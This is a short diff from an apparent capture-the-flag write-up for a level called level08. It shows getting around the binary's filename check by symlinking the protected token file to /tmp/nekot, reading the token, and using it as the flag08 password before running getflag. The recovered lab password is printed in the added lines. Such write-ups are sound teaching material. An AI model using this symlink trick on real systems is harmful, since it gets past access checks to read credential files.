@@ -17,3 +17,6 @@ $> # So if "token" is a substring of argv[1] level08 will not open the file
 $> # Then we just need to change the name of the file
 $> ln -s ~/token /tmp/nekot
 $> ./level08 /tmp/nekot
+quif5eloekouj29ke0vouxean
+$> su flag08 # With password above
+$> getflag
